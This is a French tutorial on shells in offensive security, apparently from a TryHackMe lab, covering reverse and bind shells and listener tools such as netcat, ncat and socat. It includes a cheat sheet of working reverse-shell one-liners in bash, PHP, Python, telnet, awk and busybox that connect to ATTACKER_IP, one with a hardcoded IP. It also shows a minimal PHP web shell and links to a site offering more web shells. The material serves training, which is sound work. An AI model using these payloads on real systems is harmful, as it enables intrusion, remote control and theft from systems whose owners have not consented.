# Les Shells en Cybersécurité

## Sommaire

- [Qu'est-ce qu'un Shell ?](#quest-ce-quun-shell-)
- [Reverse Shell](#reverse-shell)
  - [Comment fonctionnent les Reverse Shells](#comment-fonctionnent-les-reverse-shells)
  - [Configuration d'un écouteur Netcat](#configuration-dun-écouteur-netcat-nc)
  - [Obtention d'un accès Reverse Shell](#obtention-dun-accès-reverse-shell)
  - [L'attaquant reçoit le Shell](#lattaquant-reçoit-le-shell)
- [Bind Shell](#bind-shell)
  - [Comment fonctionnent les Bind Shells](#comment-fonctionnent-les-bind-shells)
  - [Configuration du Bind Shell sur la Cible](#configuration-du-bind-shell-sur-la-cible)
  - [L'attaquant se connecte au Bind Shell](#lattaquant-se-connecte-au-bind-shell)
- [Outils d'Écoute pour Shells](#outils-découte-pour-shells)
  - [Rlwrap](#rlwrap)
  - [Ncat](#ncat)
  - [Socat](#socat)
- [Shell Payloads](#shell-payloads)
  - [Bash](#bash)
  - [PHP](#php)
  - [Python](#python)
  - [Autres](#autres)
- [Web Shells](#web-shells)
  - [Exemple de Web Shell PHP](#exemple-de-web-shell-php)
  - [Web Shells existants disponibles en ligne](#web-shells-existants-disponibles-en-ligne)

---

# Qu'est-ce qu'un Shell ?

Un shell est un logiciel qui permet à un utilisateur d'interagir avec un système d'exploitation. Il peut s'agir d'une interface graphique, mais il s'agit généralement d'une interface en ligne de commande, selon le système d'exploitation exécuté sur le système cible.

En cybersécurité, il fait généralement référence à une session shell spécifique qu'un attaquant utilise lors de l'accès à un système compromis, lui permettant d'exécuter des commandes et des logiciels. Cela permet aux attaquants d'effectuer plusieurs activités, dont certaines sont décrites ci-dessous.

**Contrôle à distance du système** : permet à l'attaquant d'exécuter des commandes ou des logiciels à distance sur le système cible.

**Élévation de privilèges** : si l'accès initial via un shell est limité ou restreint, les attaquants peuvent explorer des moyens d'élever leurs privilèges vers un accès plus élevé ou administratif.

**Exfiltration de données** : une fois que les attaquants ont accès à l'exécution de commandes via un shell obtenu, ils peuvent explorer le système pour lire et copier des données sensibles.

**Persistance et maintien de l'accès** : une fois l'accès au shell obtenu, les attaquants peuvent créer des accès via des utilisateurs et des identifiants ou copier des logiciels backdoor pour maintenir l'accès au système cible pour une utilisation ultérieure.

**Activités post-exploitation** : après l'obtention d'un accès au shell, les attaquants peuvent effectuer un large éventail d'activités post-exploitation, telles que le déploiement de malwares, la création de comptes cachés et la suppression d'informations.

**Accès à d'autres systèmes sur le réseau** : selon les intentions de l'attaquant, le shell obtenu peut n'être qu'un point d'accès initial. L'objectif peut être de rebondir à travers le réseau vers une cible différente en utilisant le shell obtenu comme pivot vers différents points du réseau du système compromis. C'est ce qu'on appelle le pivoting.

Tous les shells que nous décrirons dans les prochaines tâches peuvent aider à contourner différentes limitations des attaques décrites ci-dessus.

---

## Reverse Shell

Un reverse shell, parfois appelé "connect back shell", est l'une des techniques les plus populaires pour obtenir l'accès à un système lors de cyberattaques. Les connexions sont initiées depuis le système cible vers la machine de l'attaquant, ce qui peut aider à éviter la détection par les pare-feu réseau et autres dispositifs de sécurité.

### Comment fonctionnent les Reverse Shells

#### Configuration d'un écouteur Netcat (nc)

Comprenons maintenant comment fonctionne un reverse shell dans un scénario pratique en utilisant l'outil Netcat. Cet utilitaire prend en charge plusieurs systèmes d'exploitation et permet la lecture et l'écriture via un réseau.

Comme mentionné ci-dessus, un reverse shell se connectera à la machine de l'attaquant. Cette machine attendra une connexion, utilisons donc Netcat pour écouter une connexion en utilisant la commande suivante : `nc -lvnp 443`.

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...
```

La commande ci-dessus utilise l'option `-l` pour indiquer à Netcat d'écouter ou d'attendre une connexion. L'option `-v` active le mode verbeux. L'option `-n` empêche les connexions d'utiliser le DNS pour la recherche, elle n'utilisera donc qu'une adresse IP. Enfin, le flag `-p` indique le port qui sera utilisé pour attendre la connexion, dans le cas ci-dessus, le port 443.

N'importe quel port peut être utilisé pour attendre une connexion, mais les attaquants et les pentesters ont tendance à utiliser des ports connus utilisés par d'autres applications comme 53, 80, 8080, 443, 139 ou 445. Cela permet de mélanger le reverse shell avec du trafic légitime et d'éviter la détection par les dispositifs de sécurité.

#### Obtention d'un accès Reverse Shell

Une fois notre écouteur configuré, l'attaquant doit exécuter ce qu'on appelle un payload de reverse shell. Ce payload exploite généralement la vulnérabilité ou l'accès non autorisé accordé par l'attaquant et exécute une commande qui exposera le shell via le réseau. Il existe une variété de payloads qui dépendront des outils et du système d'exploitation du système compromis.

À titre d'exemple, analysons un payload appelé pipe reverse shell, comme indiqué ci-dessous.

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

**Explication du Payload :**

- `rm -f /tmp/f` - Cette commande supprime tout fichier de pipe nommé existant situé à `/tmp/f/`. Cela garantit que le script peut créer un nouveau pipe nommé sans conflits.

- `mkfifo /tmp/f` - Cette commande crée un pipe nommé, ou FIFO (first-in, first-out), à `/tmp/f`. Les pipes nommés permettent une communication bidirectionnelle entre les processus. Dans ce contexte, il agit comme un conduit pour l'entrée et la sortie.

- `cat /tmp/f` - Cette commande lit les données du pipe nommé. Elle attend une entrée qui peut être envoyée via le pipe.

- `| bash -i 2>&1` - La sortie de cat est redirigée vers une instance de shell (bash -i), ce qui permet à l'attaquant d'exécuter des commandes de manière interactive. Le `2>&1` redirige l'erreur standard vers la sortie standard, garantissant que les messages d'erreur sont renvoyés à l'attaquant.

- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` - Cette partie redirige la sortie du shell via nc (Netcat) vers l'adresse IP de l'attaquant (ATTACKER_IP) sur le port de l'attaquant (ATTACKER_PORT).

- `>/tmp/f` - Cette dernière partie renvoie la sortie des commandes dans le pipe nommé, permettant une communication bidirectionnelle.

Le payload ci-dessus peut exposer le shell bash via le réseau à l'écouteur souhaité.

#### L'attaquant reçoit le Shell

Une fois le payload ci-dessus exécuté, l'attaquant recevra un reverse shell, comme indiqué ci-dessous, lui permettant d'exécuter des commandes comme s'il se connectait à un terminal normal du système d'exploitation.

**Sortie du terminal de l'attaquant (Réception du Shell) :**

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

target@tryhackme:~$
```

## Bind Shell

Comme son nom l'indique, un bind shell va lier un port sur le système compromis et écouter une connexion ; lorsque cette connexion se produit, il expose la session shell afin que l'attaquant puisse exécuter des commandes à distance.

Cette méthode peut être utilisée lorsque la cible compromise n'autorise pas les connexions sortantes, mais elle tend à être moins populaire car elle doit rester active et écouter les connexions, ce qui peut conduire à la détection.

### Comment fonctionnent les Bind Shells

#### Configuration du Bind Shell sur la Cible

Créons un bind shell. Dans ce cas, l'attaquant peut utiliser une commande comme celle ci-dessous sur la machine cible.

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

**Explication du Payload :**

- `rm -f /tmp/f` - Cette commande supprime tout fichier de pipe nommé existant situé à `/tmp/f/`. Cela garantit que le script peut créer un nouveau pipe nommé sans conflits.

- `mkfifo /tmp/f` - Cette commande crée un pipe nommé, ou FIFO, à `/tmp/f`. Les pipes nommés permettent une communication bidirectionnelle entre les processus. Dans ce contexte, il agit comme un conduit pour l'entrée et la sortie.

- `cat /tmp/f` - Cette commande lit les données du pipe nommé. Elle attend une entrée qui peut être envoyée via le pipe.

- `| bash -i 2>&1` - La sortie de cat est redirigée vers une instance de shell (bash -i), ce qui permet à l'attaquant d'exécuter des commandes de manière interactive. Le `2>&1` redirige l'erreur standard vers la sortie standard, garantissant que les messages d'erreur sont renvoyés à l'attaquant.

- `| nc -l 0.0.0.0 8080` - Démarre Netcat en mode écoute (-l) sur toutes les interfaces (0.0.0.0) et le port 8080. Le shell sera exposé à l'attaquant une fois qu'il se connectera à ce port.

- `>/tmp/f` - Cette dernière partie renvoie la sortie des commandes dans le pipe nommé, permettant une communication bidirectionnelle.

La commande ci-dessus écoutera les connexions entrantes et exposera un shell bash. Il faut noter que les ports inférieurs à 1024 nécessiteront que Netcat soit exécuté avec des privilèges élevés. Dans ce cas, l'utilisation du port 8080 évitera cela.

**Terminal sur la Machine Cible (Configuration du Bind Shell) :**

```bash
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Une fois la commande exécutée, elle attendra une connexion entrante, comme indiqué ci-dessus.

#### L'attaquant se connecte au Bind Shell

Maintenant que la machine cible attend des connexions entrantes, nous pouvons utiliser Netcat à nouveau avec la commande suivante pour nous connecter.

```bash
nc -nv TARGET_IP 8080
```

**Explication de la commande :**

- `nc` - Cela invoque Netcat, qui établit la connexion à la cible.
- `-n` - Désactive la résolution DNS, permettant à Netcat de fonctionner plus rapidement et d'éviter les recherches inutiles.
- `-v` - Le mode verbeux fournit une sortie détaillée du processus de connexion, par exemple lorsque la connexion est établie.
- `TARGET_IP` - L'adresse IP de la machine cible où le bind shell est en cours d'exécution.
- `8080` - Le numéro de port sur lequel le bind shell écoute.

**Terminal de l'attaquant (Après connexion) :**

```bash
attacker@kali:~$ nc -nv 10.10.13.37 8080 
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

Après la connexion, nous pouvons obtenir un shell, comme indiqué ci-dessus, et exécuter des commandes.

---

## Outils d'Écoute pour Shells

Comme nous l'avons appris dans les tâches précédentes, un reverse shell se connectera depuis la cible compromise vers la machine de l'attaquant. Un utilitaire comme Netcat gérera la connexion et permettra à l'attaquant d'interagir avec le shell exposé, mais Netcat n'est pas le seul utilitaire qui nous permettra de le faire.

Explorons quelques outils qui peuvent être utilisés comme écouteurs pour interagir avec un shell entrant.

### Rlwrap

C'est un petit utilitaire qui utilise la bibliothèque GNU readline pour fournir l'édition au clavier et l'historique.

**Exemple d'utilisation (Amélioration d'un Shell Netcat avec Rlwrap) :**

```bash
attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

Cela enveloppe nc avec rlwrap, permettant l'utilisation de fonctionnalités comme les touches fléchées et l'historique pour une meilleure interaction.

### Ncat

Ncat est une version améliorée de Netcat distribuée par le projet NMAP. Il fournit des fonctionnalités supplémentaires, comme le chiffrement (SSL).

**Exemple d'utilisation (Écoute de Reverse Shells) :**

```bash
attacker@kali:~$ ncat -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

**Exemple d'utilisation (Écoute de Reverse Shells avec SSL) :**

```bash
attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

L'option `--ssl` active le chiffrement SSL pour l'écouteur.

### Socat

C'est un utilitaire qui vous permet de créer une connexion socket entre deux sources de données, dans ce cas, deux hôtes différents.

**Exemple d'utilisation par défaut (Écoute de Reverse Shell) :**

```bash
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```

La commande ci-dessus utilise l'option `-d` pour activer la sortie verbeuse ; l'utiliser à nouveau (`-d -d`) augmentera la verbosité des commandes. L'option `TCP-LISTEN:443` crée un écouteur TCP sur le port 443, établissant un socket serveur pour les connexions entrantes. Enfin, l'option `STDOUT` dirige toutes les données entrantes vers le terminal.

---

## Shell Payloads

Un Shell Payload peut être une commande ou un script qui expose le shell à une connexion entrante dans le cas d'un bind shell ou une connexion sortante dans le cas d'un reverse shell.

Explorons certains de ces payloads qui peuvent être utilisés sur le système d'exploitation Linux pour exposer le shell via les reverse shells les plus populaires.

### Bash

#### Reverse Shell Bash Normal

```bash
target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

Ce reverse shell initie un shell bash interactif qui redirige l'entrée et la sortie via une connexion TCP vers l'IP de l'attaquant (ATTACKER_IP) sur le port 443. L'opérateur `>&` combine à la fois la sortie standard et l'erreur standard.

#### Reverse Shell Bash Read Line

```bash
target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

Ce reverse shell crée un nouveau descripteur de fichier (5 dans ce cas) et se connecte à un socket TCP. Il lira et exécutera les commandes depuis le socket, renvoyant la sortie via le même socket.

#### Reverse Shell Bash avec Descripteur de Fichier 196

```bash
target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```

Ce reverse shell utilise un descripteur de fichier (196 dans ce cas) pour établir une connexion TCP. Il permet au shell de lire les commandes depuis le réseau et de renvoyer la sortie via la même connexion.

#### Reverse Shell Bash avec Descripteur de Fichier 5

```bash
target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

Similaire au premier exemple, cette commande ouvre un shell (bash -i), mais elle utilise le descripteur de fichier 5 pour l'entrée et la sortie, permettant une session interactive sur la connexion TCP.

### PHP

#### Reverse Shell PHP utilisant la fonction exec

```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

Ce reverse shell crée une connexion socket vers l'IP de l'attaquant sur le port 443 et utilise la fonction exec pour exécuter un shell, redirigeant l'entrée et la sortie standard.

#### Reverse Shell PHP utilisant la fonction shell_exec

```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

Similaire à la commande précédente, mais utilise la fonction shell_exec.

#### Reverse Shell PHP utilisant la fonction system

```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```

Ce reverse shell emploie la fonction system, qui exécute la commande et affiche le résultat dans le navigateur.

#### Reverse Shell PHP utilisant la fonction passthru

```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

La fonction passthru exécute une commande et renvoie la sortie brute au navigateur. C'est utile lors du travail avec des données binaires.

#### Reverse Shell PHP utilisant la fonction popen

```bash
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

Ce reverse shell utilise popen pour ouvrir un pointeur de fichier de processus, permettant au shell d'être exécuté.

### Python

> **Note** : Les extraits suivants nécessitent l'utilisation de `python -c` pour s'exécuter, indiqué par l'espace réservé `PY-C`

#### Reverse Shell Python en exportant des variables d'environnement

```bash
target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

Ce reverse shell définit l'hôte distant et le port comme variables d'environnement, crée une connexion socket et duplique le descripteur de fichier socket pour l'entrée/sortie standard.

#### Reverse Shell Python utilisant le module subprocess

```bash
target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

Ce reverse shell utilise le module subprocess pour générer un shell et configure un environnement similaire à la commande Reverse Shell Python en exportant des variables d'environnement.

#### Reverse Shell Python Court

```bash
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

Ce reverse shell crée un socket (s), se connecte à l'attaquant et redirige l'entrée, la sortie et l'erreur standard vers le socket en utilisant `os.dup2()`.

### Autres

#### Telnet

```bash
target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```

Ce reverse shell crée un pipe nommé en utilisant mkfifo et se connecte à l'attaquant via Telnet sur l'IP ATTACKER_IP et le port 443.

#### AWK

```bash
target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

Ce reverse shell utilise les capacités TCP intégrées d'AWK pour se connecter à ATTACKER_IP:443. Il lit les commandes de l'attaquant et les exécute, puis renvoie les résultats via la même connexion TCP.

#### BusyBox

```bash
target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
```

Ce reverse shell BusyBox utilise Netcat (nc) pour se connecter à l'attaquant à ATTACKER_IP:443. Une fois connecté, il exécute /bin/sh, exposant la ligne de commande à l'attaquant.

---

## Web Shells

Un web shell est un script écrit dans un langage supporté par un serveur web compromis qui exécute des commandes via le serveur web lui-même. Un web shell est généralement un fichier contenant le code qui exécute des commandes et gère les fichiers. Il peut être caché dans une application ou un service web compromis, ce qui le rend difficile à détecter et très populaire parmi les attaquants.

Les web shells peuvent être écrits dans plusieurs langages supportés par les serveurs web, comme PHP, ASP, JSP et même de simples scripts CGI.

### Exemple de Web Shell PHP

Examinons un exemple de web shell PHP pour comprendre comment ce processus fonctionne :

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Le shell ci-dessus peut être enregistré dans un fichier avec l'extension PHP, comme `shell.php`, puis téléchargé sur le serveur web par l'attaquant en exploitant des vulnérabilités telles que le téléchargement de fichiers non restreint, l'inclusion de fichiers, l'injection de commandes, entre autres, ou en obtenant un accès non autorisé.

Après le déploiement du web shell sur le serveur, il peut être accédé via l'URL où le web shell est hébergé, dans cet exemple `http://victim.com/uploads/shell.php`. Comme nous l'avons observé dans le code de `shell.php`, nous devons fournir une méthode GET et la valeur de la variable cmd, qui doit contenir la commande que l'attaquant souhaite exécuter. Par exemple, si nous voulons exécuter la commande `whoami`, la requête à l'URL devrait être :

```
http://victim.com/uploads/shell.php?cmd=whoami
```

Ce qui précède exécutera la commande `whoami` et affichera le résultat dans le navigateur web.

### Web Shells existants disponibles en ligne

La puissance des langages supportés par les serveurs web peut aboutir à des web shells avec beaucoup de fonctionnalités et éviter la détection en même temps. Explorons certains des web shells les plus populaires qui peuvent être trouvés en ligne :

- **p0wny-shell** - Un web shell PHP minimaliste à fichier unique qui permet l'exécution de commandes à distance.

- **b374k shell** - Un web shell PHP plus riche en fonctionnalités avec gestion de fichiers et exécution de commandes, entre autres fonctionnalités.

- **c99 shell** - Un web shell PHP bien connu et robuste avec des fonctionnalités étendues.

Vous pouvez trouver plus de web shells sur : https://www.r57shell.net/index.php 